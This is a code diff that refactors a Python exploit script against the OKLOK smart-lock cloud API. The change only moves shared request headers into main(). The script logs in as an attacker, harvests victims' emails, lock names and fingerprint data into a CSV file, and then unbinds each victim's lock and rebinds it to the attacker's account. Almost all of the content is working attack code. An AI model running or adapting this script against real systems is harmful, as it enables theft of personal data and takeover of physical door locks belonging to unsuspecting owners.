@@ -14,7 +14,7 @@ def login_attacker(attacker_email_address, attacker_password):
 
 	body = {"code":attacker_password,"account":attacker_email_address,"type":"0"}
 
-	headers = {'Host': 'app.oklok.com.cn',
+	login_headers = {'Host': 'app.oklok.com.cn',
 	'Content-Type': 'application/json',
 	'Connection': 'keep-alive',
 	'Accept': '*/*',
@@ -27,7 +27,7 @@ def login_attacker(attacker_email_address, attacker_password):
 	print('Logging in...')
 
 	
-	response = requests.post(login_url, data=json.dumps(body), headers=headers)
+	response = requests.post(login_url, data=json.dumps(body), headers=login_headers)
 	json_resp = response.json()
 	status = json_resp['status']
 	if status == '2000':
@@ -44,27 +44,13 @@ def login_attacker(attacker_email_address, attacker_password):
 	else:
 		sys.exit('Login not successful.')
 
-def scan_id(victim_userID, attacker_token, attacker_userID):
+def scan_id(victim_userID, attacker_token, attacker_userID, headers):
 
 	get_user_info = 'https://app.oklok.com.cn/oklock/user/getInfo'
 
 	get_lock_info = 'https://app.oklok.com.cn/oklock/lock/getLockList'
 
-	get_fingerprints_info = 'https://app.oklok.com.cn/oklock/lock/fingerprintList'
-
-	headers = {'Host': 'app.oklok.com.cn',
-	'phoneModel': 'iPhone11,8',
-	'Accept': '*/*',
-	'appVersion': '3.1.1',
-	'Accept-Language': 'en-US;q=1',
-	'Accept-Encoding': 'gzip, deflate, br',
-	'token': attacker_token,
-	'Content-Type': 'application/json',
-	'clientType': 'iOS',
-	'language': 'en-US',
-	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
-	'Connection': 'keep-alive',
-	'osVersion': '13.3'}            
+	get_fingerprints_info = 'https://app.oklok.com.cn/oklock/lock/fingerprintList'         
 
 	print('-------------------------------------------------------------\n')
 	print('userId: ' + str(victim_userID))
@@ -142,35 +128,21 @@ def scan_id(victim_userID, attacker_token, attacker_userID):
 			writer = csv.writer(f)
 			writer.writerow([email_address,name,prints_name,barcode])
 
-		unbind(victim_userID, lockId, attacker_token, barcode)
+		unbind(victim_userID, lockId, attacker_token, barcode, headers)
 
-		bind(attacker_userID, mac, name, attacker_token, barcode)
+		bind(attacker_userID, mac, name, attacker_token, barcode, headers)
 
 	else:
+		print('\nNo lock bound to account.\n')
 		with open('userdata.csv', 'a') as f:
 			writer = csv.writer(f)
 			writer.writerow([email_address,'N/A','N/A','N/A'])
 
 
 
-def unbind(victim_userID, lockId, attacker_token, barcode):
+def unbind(victim_userID, lockId, attacker_token, barcode, headers):
 	url = 'https://app.oklok.com.cn/oklock/lock/unbind'
 	body = {"userId":victim_userID,"lockId":lockId}
-
-	headers = {'Host': 'app.oklok.com.cn',
-	'phoneModel': 'iPhone11,8',
-	'Accept': '*/*',
-	'appVersion': '3.1.1',
-	'Accept-Language': 'en-US;q=1',
-	'Accept-Encoding': 'gzip, deflate, br',
-	'token': attacker_token,
-	'Content-Type': 'application/json',
-	'Content-Length': '33',
-	'clientType': 'iOS',
-	'language': 'en-US',
-	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
-	'Connection': 'keep-alive',
-	'osVersion': '13.3'}
 
 	print('Unbinding {barcode} from victim...'.format(barcode=barcode))
 
@@ -185,24 +157,9 @@ def unbind(victim_userID, lockId, attacker_token, barcode):
 
 
 
-def bind(attacker_userID, mac, name, attacker_token, barcode):
+def bind(attacker_userID, mac, name, attacker_token, barcode, headers):
 	url = 'https://app.oklok.com.cn/oklock/lock/bind'
 	body = {"isLock":"1","userId": attacker_userID,"mac":mac,"name":name}
-
-	headers = {'Host': 'app.oklok.com.cn',
-	'phoneModel': 'iPhone11,8',
-	'Accept': '*/*',
-	'appVersion': '3.1.1',
-	'Accept-Language': 'en-US;q=1',
-	'Accept-Encoding': 'gzip, deflate, br',
-	'token': attacker_token,
-	'Content-Type': 'application/json',
-	'Content-Length': '71',
-	'clientType': 'iOS',
-	'language': 'en-US',
-	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
-	'Connection': 'keep-alive',
-	'osVersion': '13.3'}
 
 	print('Binding {barcode} to attacker...'.format(barcode=barcode))
 
@@ -229,7 +186,7 @@ def main():
 
 	with open('userdata.csv', 'w') as f:
 			writer = csv.writer(f)
-			writer.writerow(['receiver_email','lock_name','fingerprint_name','barcode']) 
+			writer.writerow(['email','lock_name','fingerprint_name','barcode']) 
 
 	attacker_token_userID = login_attacker(attacker_email_address, attacker_password)
 
@@ -237,7 +194,21 @@ def main():
 
 	attacker_userID = attacker_token_userID[1]
 
-	scan_id(victim_userID, attacker_token, attacker_userID)
+	headers = {'Host': 'app.oklok.com.cn',
+    'phoneModel': 'iPhone11,8',
+    'Accept': '*/*',
+    'appVersion': '3.1.1',
+    'Accept-Language': 'en-US;q=1',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'token': attacker_token,
+    'Content-Type': 'application/json',
+    'clientType': 'iOS',
+    'language': 'en-US',
+    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
+    'Connection': 'keep-alive',
+    'osVersion': '13.3'}
+
+	scan_id(victim_userID, attacker_token, attacker_userID, headers)
 
 	total_time = datetime.datetime.now() - start_time
 
